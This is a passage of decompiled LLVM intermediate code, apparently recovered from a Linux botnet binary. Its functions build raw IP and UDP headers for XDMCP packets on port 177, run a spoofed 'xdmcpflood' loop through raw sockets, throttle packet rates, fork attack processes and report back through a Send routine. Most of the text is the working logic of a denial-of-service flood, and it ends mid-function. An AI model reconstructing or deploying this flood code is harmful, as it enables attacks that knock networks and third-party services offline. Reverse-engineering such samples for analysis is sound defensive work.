  %storemerge41 = phi i32 [ %v4_804cc26, %dec_label_pc_804cc01 ], [ 0, %dec_label_pc_804cb6c ]
  %v1_804cc1540 = phi i32 [ %v1_804cc23, %dec_label_pc_804cc01 ], [ %v2_804cbd7, %dec_label_pc_804cb6c ]
  store i32 %v2_804cc0742, i32* @ecx, align 4
  %v2_804cc0f = mul i32 %storemerge41, 4
  %v2_804cc12 = add i32 %v2_804cc0f, %v2_804cbe2
  store i32 %v2_804cc12, i32* %eax.global-to-local, align 4
  %v2_804cc15 = add i32 %v1_804cc1540, -4
  %v3_804cc15 = inttoptr i32 %v2_804cc15 to i32*
  store i32 %v2_804cc0742, i32* %v3_804cc15, align 4
  %v1_804cc16 = add i32 %v1_804cc1540, -8
  %v2_804cc16 = inttoptr i32 %v1_804cc16 to i32*
  store i32 134531263, i32* %v2_804cc16, align 4
  %v1_804cc1b = add i32 %v1_804cc1540, -12
  %v2_804cc1b = inttoptr i32 %v1_804cc1b to i32*
  store i32 0, i32* %v2_804cc1b, align 4
  %v0_804cc1d = load i32, i32* %eax.global-to-local, align 4
  %v2_804cc1d = add i32 %v1_804cc1540, -16
  %v3_804cc1d = inttoptr i32 %v2_804cc1d to i32*
  store i32 %v0_804cc1d, i32* %v3_804cc1d, align 4
  %v0_804cc1e = call i32 @pthread_create()
  %v0_804cc23 = load i32, i32* @esp, align 4
  %v1_804cc23 = add i32 %v0_804cc23, 16
  %v4_804cc26 = add nuw nsw i32 %storemerge41, 1
  store i32 %v1_804cc04, i32* %eax.global-to-local, align 4
  %v2_804cc07 = load i32, i32* %v1_804cc07, align 4
  %exitcond = icmp eq i32 %v4_804cc26, %v1_804cb78
  br i1 %exitcond, label %dec_label_pc_804cc31, label %dec_label_pc_804cc01

dec_label_pc_804cc31:                             ; preds = %dec_label_pc_804cc01, %dec_label_pc_804cb6c
  %v1_804cc15.lcssa = phi i32 [ %v2_804cbd7, %dec_label_pc_804cb6c ], [ %v1_804cc23, %dec_label_pc_804cc01 ]
  %storemerge.lcssa = phi i32 [ 0, %dec_label_pc_804cb6c ], [ %v1_804cb78, %dec_label_pc_804cc01 ]
  %v2_804cc07.lcssa = phi i32 [ %v2_804cc0739, %dec_label_pc_804cb6c ], [ %v2_804cc07, %dec_label_pc_804cc01 ]
  store i32 %v2_804cc07.lcssa, i32* %eax.global-to-local, align 4
  %v2_804cc39 = add i32 %v1_804cc15.lcssa, -4
  %v3_804cc39 = inttoptr i32 %v2_804cc39 to i32*
  store i32 %v2_804cc07.lcssa, i32* %v3_804cc39, align 4
  %v5_804cc3a = add i32 %v1_804cc15.lcssa, -8
  %v6_804cc3a = inttoptr i32 %v5_804cc3a to i32*
  store i32 %arg2, i32* %v6_804cc3a, align 4
  %v1_804cc3d = add i32 %v1_804cc15.lcssa, -12
  %v2_804cc3d = inttoptr i32 %v1_804cc3d to i32*
  store i32 ptrtoint ([29 x i8]* @global_var_80694b6.171 to i32), i32* %v2_804cc3d, align 4
  %v5_804cc42 = add i32 %v1_804cc15.lcssa, -16
  %v6_804cc42 = inttoptr i32 %v5_804cc42 to i32*
  store i32 %arg1, i32* %v6_804cc42, align 4
  %v1_804cc45 = load i32, i32* %stack_var_-4, align 4
  %v2_804cc45 = call i32 @Send(i32 %storemerge.lcssa, i32 %v1_804cc45)
  %v0_804cc4a = load i32, i32* @esp, align 4
  store i32 %v1_804cb9d, i32* %eax.global-to-local, align 4
  %v2_804cc5a = load i32, i32* %v1_804cba0, align 4
  store i32 %v2_804cc5a, i32* %eax.global-to-local, align 4
  %v3_804cc5f = inttoptr i32 %v0_804cc4a to i32*
  store i32 %v2_804cc5a, i32* %v3_804cc5f, align 4
  %v1_804cc60 = call i32 @atol(i32 0)
  %v0_804cc65 = load i32, i32* @esp, align 4
  %v9_804cc68 = mul i32 %v1_804cc60, 20
  store i32 %v9_804cc68, i32* %eax.global-to-local, align 4
  %v7_804cc6f = icmp sgt i32 %v9_804cc68, 0
  br i1 %v7_804cc6f, label %dec_label_pc_804cc75, label %dec_label_pc_804cd51

dec_label_pc_804cc75:                             ; preds = %dec_label_pc_804cc31
  store i32 50000, i32* %eax.global-to-local, align 4
  %v3_804cca3 = inttoptr i32 %v0_804cc65 to i32*
  store i32 50000, i32* %v3_804cca3, align 4
  %v2_804cca4 = call i32 @usleep(i64 0)
  %v0_804ccac = load i64, i64* @global_var_807d500.88, align 8
  %sext = mul i64 %v0_804ccac, 4294967296
  %v2_804ccb5 = sdiv i64 %sext, 4294967296
  %v4_804ccb5 = mul nsw i64 %v2_804ccb5, 20
  %v5_804ccb5 = trunc i64 %v4_804ccb5 to i32
  %tmp46 = icmp ugt i32 %v5_804ccb5, %v1_804cb8f
  %v0_804cce4 = load i32, i32* @global_var_807d3c8.89, align 8
  store i32 %v0_804cce4, i32* %eax.global-to-local, align 4
  br i1 %tmp46, label %dec_label_pc_804ccbf, label %dec_label_pc_804cce4

dec_label_pc_804ccbf:                             ; preds = %dec_label_pc_804cc75
  %tmp36 = icmp slt i32 %v0_804cce4, 1
  %tmp37 = icmp eq i1 %tmp36, false
  br i1 %tmp37, label %dec_label_pc_804ccd7, label %dec_label_pc_804ccc8

dec_label_pc_804ccc8:                             ; preds = %dec_label_pc_804ccbf
  %v0_804ccc8 = load i32, i32* @global_var_806ffa8.90, align 8
  %v1_804cccd = add i32 %v0_804ccc8, 100
  store i32 %v1_804cccd, i32* %eax.global-to-local, align 4
  store i32 %v1_804cccd, i32* @global_var_806ffa8.90, align 8
  br label %dec_label_pc_804cd12

dec_label_pc_804ccd7:                             ; preds = %dec_label_pc_804ccbf
  %v1_804ccdc = add i32 %v0_804cce4, -1
  store i32 %v1_804ccdc, i32* %eax.global-to-local, align 4
  store i32 %v1_804ccdc, i32* @global_var_807d3c8.89, align 8
  br label %dec_label_pc_804cd12

dec_label_pc_804cce4:                             ; preds = %dec_label_pc_804cc75
  %v1_804cce9 = add i32 %v0_804cce4, 1
  store i32 %v1_804cce9, i32* @global_var_807d3c8.89, align 8
  %v0_804ccef = load i32, i32* @global_var_806ffa8.90, align 8
  store i32 %v0_804ccef, i32* %eax.global-to-local, align 4
  %v1_804ccf4 = add i32 %v0_804ccef, -25
  %v5_804ccf4 = icmp ult i32 %v0_804ccef, 25
  %v9_804ccf4 = icmp eq i32 %v1_804ccf4, 0
  %v2_804ccf7 = or i1 %v5_804ccf4, %v9_804ccf4
  br i1 %v2_804ccf7, label %dec_label_pc_804cd08, label %dec_label_pc_804ccf9

dec_label_pc_804ccf9:                             ; preds = %dec_label_pc_804cce4
  store i32 %v1_804ccf4, i32* %eax.global-to-local, align 4
  store i32 %v1_804ccf4, i32* @global_var_806ffa8.90, align 8
  br label %dec_label_pc_804cd12

dec_label_pc_804cd08:                             ; preds = %dec_label_pc_804cce4
  store i32 0, i32* @global_var_806ffa8.90, align 8
  br label %dec_label_pc_804cd12

dec_label_pc_804cd12:                             ; preds = %dec_label_pc_804ccf9, %dec_label_pc_804ccd7, %dec_label_pc_804ccc8, %dec_label_pc_804cd08
  store i64 0, i64* @global_var_807d500.88, align 256
  %v5_804cd34 = add i32 %v1_804cba6, %v2_804cafe
  br label %dec_label_pc_804cd1c

dec_label_pc_804cd1c:                             ; preds = %dec_label_pc_804cd4c, %dec_label_pc_804cd12
  %stack_var_-12.0 = phi i32 [ %tmp, %dec_label_pc_804cd12 ], [ %v4_804cd4c, %dec_label_pc_804cd4c ]
  %v7_804cd20 = icmp sgt i32 %stack_var_-12.0, 99
  br i1 %v7_804cd20, label %dec_label_pc_804cd22, label %dec_label_pc_804cd4c

dec_label_pc_804cd22:                             ; preds = %dec_label_pc_804cd1c
  %v0_804cd22 = load i32, i32* @esp, align 4
  %v1_804cd25 = add i32 %v0_804cd22, -16
  %v2_804cd25 = inttoptr i32 %v1_804cd25 to i32*
  store i32 0, i32* %v2_804cd25, align 4
  %v2_804cd27 = call i32 @__GI_time(i32* null)
  %v0_804cd2c = load i32, i32* @esp, align 4
  store i32 %v5_804cd34, i32* %eax.global-to-local, align 4
  %v7_804cd37 = icmp ult i32 %v2_804cd27, %v5_804cd34
  br i1 %v7_804cd37, label %dec_label_pc_804cd4c, label %dec_label_pc_804cd3b

dec_label_pc_804cd3b:                             ; preds = %dec_label_pc_804cd22
  %v2_804cd3e = inttoptr i32 %v0_804cd2c to i32*
  store i32 0, i32* %v2_804cd3e, align 4
  %v1_804cd40 = call i32 @__GI_exit(i32 0)
  store i32 %v1_804cd40, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804cd4c

dec_label_pc_804cd4c:                             ; preds = %dec_label_pc_804cd3b, %dec_label_pc_804cd22, %dec_label_pc_804cd1c
  %stack_var_-12.1 = phi i32 [ %stack_var_-12.0, %dec_label_pc_804cd1c ], [ 0, %dec_label_pc_804cd22 ], [ 0, %dec_label_pc_804cd3b ]
  %v4_804cd4c = add i32 %stack_var_-12.1, 1
  br label %dec_label_pc_804cd1c

dec_label_pc_804cd51:                             ; preds = %dec_label_pc_804cc31
  %v2_804cd54 = inttoptr i32 %v0_804cc65 to i32*
  store i32 0, i32* %v2_804cd54, align 4
  %v1_804cd56 = call i32 @__GI_exit(i32 %tmp)
  store i32 %v1_804cd56, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804cd5b

dec_label_pc_804cd5b:                             ; preds = %entry, %dec_label_pc_804cd51
  %v0_804cd5f = phi i32 [ %v1_804cb0f, %entry ], [ %v1_804cd56, %dec_label_pc_804cd51 ]
  ret i32 %v0_804cd5f

; uselistorder directives
  uselistorder i32 %v1_804ccf4, { 1, 0, 2 }
  uselistorder i32 %v0_804cce4, { 2, 1, 0, 3 }
  uselistorder i32 %v9_804cc68, { 1, 0 }
  uselistorder i32 %v0_804cc65, { 1, 0 }
  uselistorder i32 %v4_804cc26, { 1, 0 }
  uselistorder i32 %storemerge41, { 1, 0 }
  uselistorder i32 %v2_804cc0742, { 1, 0 }
  uselistorder i32* %v1_804cc07, { 1, 0 }
  uselistorder i32 %v1_804cc04, { 2, 0, 1 }
  uselistorder i32 %v2_804cbe2, { 1, 0 }
  uselistorder i32 %v4_804cb46, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
  uselistorder i32* %stack_var_-76, { 0, 1, 2, 4, 3 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 7, 6, 8, 9, 10, 11, 12, 15, 13, 14, 28, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27 }
  uselistorder i32 %arg4, { 3, 2, 1, 0 }
  uselistorder i32 %arg2, { 2, 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804cd5b, { 1, 0 }
  uselistorder label %dec_label_pc_804cd12, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804cc01, { 1, 0 }
  uselistorder label %dec_label_pc_804cb6c, { 1, 0 }
  uselistorder label %dec_label_pc_804cb46, { 1, 0 }
}

define i32 @setup_xdmcp_ip_header(i8* %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_804cd60 = load i32, i32* @ebp, align 4
  store i32 %v0_804cd60, i32* %stack_var_-4, align 4
  %v4_804cd66 = ptrtoint i8* %arg1 to i32
  store i8 69, i8* %arg1, align 1
  %v1_804cd83 = add i32 %v4_804cd66, 1
  %v2_804cd83 = inttoptr i32 %v1_804cd83 to i8*
  store i8 0, i8* %v2_804cd83, align 1
  %v1_804cd8a = add i32 %v4_804cd66, 2
  %v2_804cd8a = inttoptr i32 %v1_804cd8a to i16*
  store i16 35, i16* %v2_804cd8a, align 2
  %v2_804cd98 = call i32 @htonl(i32 54321)
  %v3_804cd98 = trunc i32 %v2_804cd98 to i16
  %sext = mul i32 %v2_804cd98, 65536
  %v1_804cda0 = sdiv i32 %sext, 65536
  store i32 %v1_804cda0, i32* @edx, align 4
  %v3_804cda5 = add i32 %v4_804cd66, 4
  %v4_804cda5 = inttoptr i32 %v3_804cda5 to i16*
  store i16 %v3_804cd98, i16* %v4_804cda5, align 2
  %v1_804cdac = add i32 %v4_804cd66, 6
  %v2_804cdac = inttoptr i32 %v1_804cdac to i16*
  store i16 0, i16* %v2_804cdac, align 2
  %v1_804cdb5 = add i32 %v4_804cd66, 8
  %v2_804cdb5 = inttoptr i32 %v1_804cdb5 to i8*
  store i8 -1, i8* %v2_804cdb5, align 1
  %v1_804cdbc = add i32 %v4_804cd66, 9
  %v2_804cdbc = inttoptr i32 %v1_804cdbc to i8*
  store i8 17, i8* %v2_804cdbc, align 1
  %v1_804cdc3 = add i32 %v4_804cd66, 10
  %v2_804cdc3 = inttoptr i32 %v1_804cdc3 to i16*
  store i16 0, i16* %v2_804cdc3, align 2
  %v2_804cdd1 = call i32 @inet_addr(i32 ptrtoint ([14 x i8]* @global_var_8068d85.78 to i32))
  %v3_804cdde = add i32 %v4_804cd66, 12
  %v4_804cdde = inttoptr i32 %v3_804cdde to i32*
  store i32 %v2_804cdd1, i32* %v4_804cdde, align 4
  %v2_804cde1 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804cde1, i32* @ebp, align 4
  ret i32 %v4_804cd66
}

define i32 @setup_xdmcp_udp_header(i16* %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %v1_804cdf1 = call i32 @htons(i32 5678)
  %v2_804cdf1 = trunc i32 %v1_804cdf1 to i16
  %sext = mul i32 %v1_804cdf1, 65536
  %v1_804cdf9 = sdiv i32 %sext, 65536
  store i32 %v1_804cdf9, i32* %edx.global-to-local, align 4
  %v4_804cdfb = ptrtoint i16* %arg1 to i32
  store i32 %v4_804cdfb, i32* %eax.global-to-local, align 4
  store i16 %v2_804cdf1, i16* %arg1, align 2
  %v1_804ce09 = call i32 @htons(i32 177)
  %v2_804ce09 = trunc i32 %v1_804ce09 to i16
  %v3_804ce16 = add i32 %v4_804cdfb, 2
  %v4_804ce16 = inttoptr i32 %v3_804ce16 to i16*
  store i16 %v2_804ce09, i16* %v4_804ce16, align 2
  %v1_804ce1d = add i32 %v4_804cdfb, 6
  %v2_804ce1d = inttoptr i32 %v1_804ce1d to i16*
  store i16 0, i16* %v2_804ce1d, align 2
  %v1_804ce26 = add i32 %v4_804cdfb, 8
  store i32 %v1_804ce26, i32* %edx.global-to-local, align 4
  store i32 33554688, i32* %eax.global-to-local, align 4
  %v2_804ce2e = inttoptr i32 %v1_804ce26 to i32*
  store i32 33554688, i32* %v2_804ce2e, align 4
  %v2_804ce30 = load i32, i32* %eax.global-to-local, align 4
  %v3_804ce30 = and i32 %v2_804ce30, -65536
  %v4_804ce30 = or i32 %v3_804ce30, 256
  store i32 %v4_804ce30, i32* %eax.global-to-local, align 4
  %v2_804ce36 = load i32, i32* %edx.global-to-local, align 4
  %v3_804ce36 = add i32 %v2_804ce36, 4
  %v4_804ce36 = inttoptr i32 %v3_804ce36 to i16*
  store i16 256, i16* %v4_804ce36, align 2
  %v2_804ce3a = load i32, i32* %eax.global-to-local, align 4
  %v3_804ce3a = and i32 %v2_804ce3a, -256
  store i32 %v3_804ce3a, i32* %eax.global-to-local, align 4
  %v2_804ce3f = load i32, i32* %edx.global-to-local, align 4
  %v3_804ce3f = add i32 %v2_804ce3f, 6
  %v4_804ce3f = inttoptr i32 %v3_804ce3f to i8*
  store i8 0, i8* %v4_804ce3f, align 1
  %v1_804ce47 = call i32 @htons(i32 15)
  %v2_804ce47 = trunc i32 %v1_804ce47 to i16
  %sext3 = mul i32 %v1_804ce47, 65536
  %v1_804ce4f = sdiv i32 %sext3, 65536
  store i32 %v1_804ce4f, i32* %edx.global-to-local, align 4
  store i32 %v4_804cdfb, i32* %eax.global-to-local, align 4
  %v4_804ce54 = add i32 %v4_804cdfb, 4
  %v5_804ce54 = inttoptr i32 %v4_804ce54 to i16*
  store i16 %v2_804ce47, i16* %v5_804ce54, align 2
  ret i32 %v4_804cdfb

; uselistorder directives
  uselistorder i32 %v4_804cdfb, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i16* %arg1, { 1, 0 }
}

define i32 @xdmcpflood(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4144 = alloca i32, align 4
  %stack_var_-4124 = alloca i32, align 4
  %v2_804ce69 = ptrtoint i32* %stack_var_-4124 to i32
  %v1_804ce75 = add i32 %v2_804ce69, 20
  %v5_804ce78 = inttoptr i32 %v1_804ce75 to i16*
  %v1_804ce87 = add i32 %arg1, 12
  %v2_804ce87 = inttoptr i32 %v1_804ce87 to i32*
  %v3_804ce87 = load i32, i32* %v2_804ce87, align 4
  %v1_804cea5 = add i32 %arg1, 4
  %v2_804cea5 = inttoptr i32 %v1_804cea5 to i32*
  %v3_804cea5 = load i32, i32* %v2_804cea5, align 4
  %v3_804ceb4 = call i32 @socket(i32 2, i32 3, i32 6)
  %v5_804cebf = icmp slt i32 %v3_804ceb4, 0
  %v1_804cec3 = icmp eq i1 %v5_804cebf, false
  br i1 %v1_804cec3, label %entry.dec_label_pc_804cecf_crit_edge, label %dec_label_pc_804cec5

entry.dec_label_pc_804cecf_crit_edge:             ; preds = %entry
  br label %dec_label_pc_804cecf

dec_label_pc_804cec5:                             ; preds = %entry
  %v1_804ceca = call i32 @__GI_exit(i32 -1)
  br label %dec_label_pc_804cecf

dec_label_pc_804cecf:                             ; preds = %entry.dec_label_pc_804cecf_crit_edge, %dec_label_pc_804cec5
  %v2_804ced4 = call i32 @__GI_time(i32* null)
  %v1_804cedd = call i32 @init_rand(i32 %v2_804ced4)
  %v3_804cef9 = bitcast i32* %stack_var_-4124 to i8*
  %v4_804cef9 = call i32 @__GI_memset(i8* %v3_804cef9, i32 0, i32 4096)
  store i32 %v4_804cef9, i32* @eax, align 4
  %v2_804cf07 = call i32 @setup_xdmcp_ip_header(i8* %v3_804cef9)
  %v2_804cf15 = call i32 @setup_xdmcp_udp_header(i16* %v5_804ce78)
  %v0_804cf1d = call i32 @random()
  %v2_804cf2d = ashr i32 %v0_804cf1d, 31
  %v2_804cf30 = zext i32 %v0_804cf1d to i64
  %v4_804cf30 = zext i32 %v2_804cf2d to i64
  %v5_804cf30 = mul nuw i64 %v4_804cf30, 4294967296
  %v6_804cf30 = or i64 %v5_804cf30, %v2_804cf30
  %v10_804cf30 = srem i64 %v6_804cf30, 65535
  %v11_804cf30 = trunc i64 %v10_804cf30 to i32
  %v1_804cf34 = add i32 %v11_804cf30, 64510
  %v1_804cf39 = urem i32 %v1_804cf34, 65536
  %v1_804cf42 = call i32 @htons(i32 %v1_804cf39)
  %v2_804cf42 = trunc i32 %v1_804cf42 to i16
  store i16 %v2_804cf42, i16* %v5_804ce78, align 4
  %v2_804cf5b = add i32 %v2_804ce69, 12
  %v3_804cf5b = inttoptr i32 %v2_804cf5b to i32*
  store i32 %v3_804ce87, i32* %v3_804cf5b, align 4
  %v1_804cf61 = add i32 %v3_804cea5, 4
  %v2_804cf61 = inttoptr i32 %v1_804cf61 to i32*
  %v3_804cf61 = load i32, i32* %v2_804cf61, align 4
  %v2_804cf67 = add i32 %v2_804ce69, 16
  %v3_804cf67 = inttoptr i32 %v2_804cf67 to i32*
  store i32 %v3_804cf61, i32* %v3_804cf67, align 4
  %v1_804cf6d = or i32 %v2_804ce69, 2
  %v2_804cf6d = inttoptr i32 %v1_804cf6d to i16*
  %v3_804cf6d = load i16, i16* %v2_804cf6d, align 2
  %v3_804cf71 = udiv i16 %v3_804cf6d, 2
  %v9_804cf71 = zext i16 %v3_804cf71 to i32
  %v2_804cf81 = bitcast i32* %stack_var_-4124 to i16*
  %v3_804cf81 = call i32 @csum(i16* %v2_804cf81, i32 %v9_804cf71)
  %v4_804cf81 = trunc i32 %v3_804cf81 to i16
  %v3_804cf8e = add i32 %v2_804ce69, 10
  %v4_804cf8e = inttoptr i32 %v3_804cf8e to i16*
  store i16 %v4_804cf81, i16* %v4_804cf8e, align 2
  store i32 1, i32* %stack_var_-4144, align 4
  %v2_804cf9c = ptrtoint i32* %stack_var_-4144 to i32
  %v5_804cfb4 = call i32 @__GI_setsockopt(i32 %v3_804ceb4, i32 0, i32 3, i32 %v2_804cf9c, i32 4)
  %v2_804cfbc = icmp slt i32 %v5_804cfb4, 0
  %v1_804cfbe = icmp eq i1 %v2_804cfbc, false
  br i1 %v1_804cfbe, label %dec_label_pc_804cfca, label %dec_label_pc_804cfc0

dec_label_pc_804cfc0:                             ; preds = %dec_label_pc_804cecf
  %v1_804cfc5 = call i32 @__GI_exit(i32 -1)
  br label %dec_label_pc_804cfca

dec_label_pc_804cfca:                             ; preds = %dec_label_pc_804cecf, %dec_label_pc_804cfc0
  %v2_804cfcf = call i32 @__GI_time(i32* null)
  %v1_804cfd8 = call i32 @init_rand(i32 %v2_804cfcf)
  %v3_804d044 = add i32 %v2_804ce69, 4
  %v4_804d044 = inttoptr i32 %v3_804d044 to i16*
  br label %dec_label_pc_804cfea

dec_label_pc_804cfea:                             ; preds = %dec_label_pc_804d0a3, %dec_label_pc_804cfca
  %stack_var_-16.0 = phi i32 [ %v3_804cea5, %dec_label_pc_804cfca ], [ %v3_804d019, %dec_label_pc_804d0a3 ]
  %storemerge = phi i32 [ 0, %dec_label_pc_804cfca ], [ %v4_804d0a3, %dec_label_pc_804d0a3 ]
  %v3_804cff2 = load i16, i16* %v2_804cf6d, align 2
  %v4_804cff2 = zext i16 %v3_804cff2 to i32
  %v6_804d00e = call i32 @sendto(i32 %v3_804ceb4, i32 %v2_804ce69, i32 %v4_804cff2, i32 0, i32 %stack_var_-16.0, i32 16)
  %v1_804d019 = add i32 %stack_var_-16.0, 532
  %v2_804d019 = inttoptr i32 %v1_804d019 to i32*
  %v3_804d019 = load i32, i32* %v2_804d019, align 4
  %v1_804d025 = add i32 %v3_804d019, 4
  %v2_804d025 = inttoptr i32 %v1_804d025 to i32*
  %v3_804d025 = load i32, i32* %v2_804d025, align 4
  store i32 %v3_804d025, i32* %v3_804cf67, align 4
  %v1_804d02e = call i32 @rand_cmwc(i32 %v3_804d019)
  %v1_804d037 = call i32 @htonl(i32 %v1_804d02e)
  %v2_804d037 = trunc i32 %v1_804d037 to i16
  store i16 %v2_804d037, i16* %v4_804d044, align 4
  %v3_804d04b = load i16, i16* %v2_804cf6d, align 2
  %v3_804d04f = udiv i16 %v3_804d04b, 2
  %v9_804d04f = zext i16 %v3_804d04f to i32
  %v3_804d05f = call i32 @csum(i16* %v2_804cf81, i32 %v9_804d04f)
  %v4_804d05f = trunc i32 %v3_804d05f to i16
  store i16 %v4_804d05f, i16* %v4_804cf8e, align 2
  %v0_804d070 = load i64, i64* @global_var_807d500.88, align 8
  %v1_804d070 = trunc i64 %v0_804d070 to i32
  %v1_804d075 = add i32 %v1_804d070, 1
  %v1_804d076 = sext i32 %v1_804d075 to i64
  store i64 %v1_804d076, i64* @global_var_807d500.88, align 256
  %v0_804d07b = load i32, i32* @global_var_807d3c8.89, align 8
  %v6_804d086 = icmp ugt i32 %v0_804d07b, %storemerge
  br i1 %v6_804d086, label %dec_label_pc_804cfea.dec_label_pc_804d0a3_crit_edge, label %dec_label_pc_804d088

dec_label_pc_804cfea.dec_label_pc_804d0a3_crit_edge: ; preds = %dec_label_pc_804cfea
  br label %dec_label_pc_804d0a3

dec_label_pc_804d088:                             ; preds = %dec_label_pc_804cfea
  %v0_804d092 = load i32, i32* @global_var_806ffa8.90, align 8
  %v1_804d09b = sext i32 %v0_804d092 to i64
  %v2_804d09b = call i32 @usleep(i64 %v1_804d09b)
  br label %dec_label_pc_804d0a3

dec_label_pc_804d0a3:                             ; preds = %dec_label_pc_804cfea.dec_label_pc_804d0a3_crit_edge, %dec_label_pc_804d088
  %stack_var_-4152.0 = phi i32 [ %storemerge, %dec_label_pc_804cfea.dec_label_pc_804d0a3_crit_edge ], [ 0, %dec_label_pc_804d088 ]
  %v4_804d0a3 = add i32 %stack_var_-4152.0, 1
  br label %dec_label_pc_804cfea

; uselistorder directives
  uselistorder i32 %v3_804d019, { 1, 2, 0 }
  uselistorder i32 %stack_var_-16.0, { 1, 0 }
  uselistorder i32 %v2_804ce69, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder i32* %stack_var_-4144, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804d0a3, { 1, 0 }
  uselistorder label %dec_label_pc_804cfca, { 1, 0 }
  uselistorder label %dec_label_pc_804cecf, { 1, 0 }
}

define i32 @sendTheXDMCP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-1104 = alloca i32, align 4
  %stack_var_-1164 = alloca i32, align 4
  %stack_var_-1148 = alloca i32, align 4
  %v15_804d0b4 = ptrtoint i32* %stack_var_-1148 to i32
  store i32 %v15_804d0b4, i32* @eax, align 4
  store i32 %arg2, i32* %stack_var_-1164, align 4
  %v7_804d0c5 = ptrtoint i32* %stack_var_-1164 to i32
  %v1_804d0c8 = call i32 @mfork(i32 %arg2)
  store i32 %v1_804d0c8, i32* %eax.global-to-local, align 4
  %v1_804d0d0 = icmp eq i32 %v1_804d0c8, 0
  %v1_804d0d2 = icmp eq i1 %v1_804d0d0, false
  br i1 %v1_804d0d2, label %dec_label_pc_804d6a3, label %dec_label_pc_804d0d8

dec_label_pc_804d0d8:                             ; preds = %entry
  store i32 2, i32* %stack_var_-1164, align 4
  %v3_804d0e4 = call i32 @socket(i32 2, i32 3, i32 255)
  store i32 %v3_804d0e4, i32* %eax.global-to-local, align 4
  %v5_804d0ef = icmp slt i32 %v3_804d0e4, 0
  %v1_804d0f3 = icmp eq i1 %v5_804d0ef, false
  br i1 %v1_804d0f3, label %dec_label_pc_804d0ff, label %dec_label_pc_804d0f5

dec_label_pc_804d0f5:                             ; preds = %dec_label_pc_804d0d8
  store i32 1, i32* %stack_var_-1164, align 4
  %v1_804d0fa = call i32 @__GI_exit(i32 1)
  store i32 %v1_804d0fa, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d0ff

dec_label_pc_804d0ff:                             ; preds = %dec_label_pc_804d0d8, %dec_label_pc_804d0f5
  %v4_804d0ff = add i32 %arg3, -5
  %v9_804d0ff = sub i32 4, %arg3
  %v10_804d0ff = and i32 %v9_804d0ff, %arg3
  %v11_804d0ff = icmp slt i32 %v10_804d0ff, 0
  %v12_804d0ff = icmp eq i32 %v4_804d0ff, 0
  %v13_804d0ff = icmp slt i32 %v4_804d0ff, 0
  %v3_804d103 = icmp eq i1 %v13_804d0ff, %v11_804d0ff
  %v4_804d103 = icmp eq i1 %v12_804d0ff, false
  %v5_804d103 = and i1 %v4_804d103, %v3_804d103
  br i1 %v5_804d103, label %dec_label_pc_804d0ff.dec_label_pc_804d125_crit_edge, label %dec_label_pc_804d105

dec_label_pc_804d0ff.dec_label_pc_804d125_crit_edge: ; preds = %dec_label_pc_804d0ff
  br label %dec_label_pc_804d125

dec_label_pc_804d105:                             ; preds = %dec_label_pc_804d0ff
  %v3_804d113 = call i32 @Send(i32 %arg1, i32 ptrtoint ([114 x i8]* @global_var_80694dc.175 to i32))
  store i32 %v3_804d113, i32* %eax.global-to-local, align 4
  %v2_804d120 = call i32 @__GI_exit(i32 1)
  store i32 %v2_804d120, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d125

dec_label_pc_804d125:                             ; preds = %dec_label_pc_804d0ff.dec_label_pc_804d125_crit_edge, %dec_label_pc_804d105
  %v3_804d12a = call i32 @__GI_time(i32* null)
  %v1_804d138 = add i32 %arg4, 24
  store i32 %v1_804d138, i32* %eax.global-to-local, align 4
  %v1_804d13b = inttoptr i32 %v1_804d138 to i32*
  %v2_804d13b = load i32, i32* %v1_804d13b, align 4
  %v1_804d143 = add i32 %arg4, 12
  store i32 %v1_804d143, i32* %eax.global-to-local, align 4
  %v1_804d146 = inttoptr i32 %v1_804d143 to i32*
  %v2_804d146 = load i32, i32* %v1_804d146, align 4
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v1_804d153 = and i32 %v2_804d146, -256
  store i32 %v1_804d153, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  %v4_804d156 = inttoptr i32 %v2_804d146 to i8*
  %v3_804d15c = call i32 @_strlen(i8* %v4_804d156)
  %v4_804d15c = mul i32 %v3_804d15c, -1
  %v5_804d15c = add i32 %v4_804d15c, -2
  store i32 %v5_804d15c, i32* %ecx.global-to-local, align 4
  %v1_804d162 = sub i32 0, %v4_804d15c
  store i32 %v1_804d162, i32* %edx.global-to-local, align 4
  %v2_804d16a = mul i32 %v3_804d15c, 5
  %v1_804d16c = add i32 %v2_804d16a, 160
  store i32 %v1_804d16c, i32* %eax.global-to-local, align 4
  %v4_804d174 = add i32 %v2_804d16a, -863
  %v9_804d174 = sub i32 862, %v2_804d16a
  %v10_804d174 = and i32 %v9_804d174, %v1_804d16c
  %v11_804d174 = icmp slt i32 %v10_804d174, 0
  %v12_804d174 = icmp eq i32 %v4_804d174, 0
  %v13_804d174 = icmp slt i32 %v4_804d174, 0
  %v3_804d17b = icmp eq i1 %v13_804d174, %v11_804d174
  %v4_804d17b = icmp eq i1 %v12_804d174, false
  %v5_804d17b = and i1 %v4_804d17b, %v3_804d17b
  br i1 %v5_804d17b, label %dec_label_pc_804d6a3, label %dec_label_pc_804d181

dec_label_pc_804d181:                             ; preds = %dec_label_pc_804d125
  store i32 %v1_804d143, i32* %eax.global-to-local, align 4
  %v2_804d187 = load i32, i32* %v1_804d146, align 4
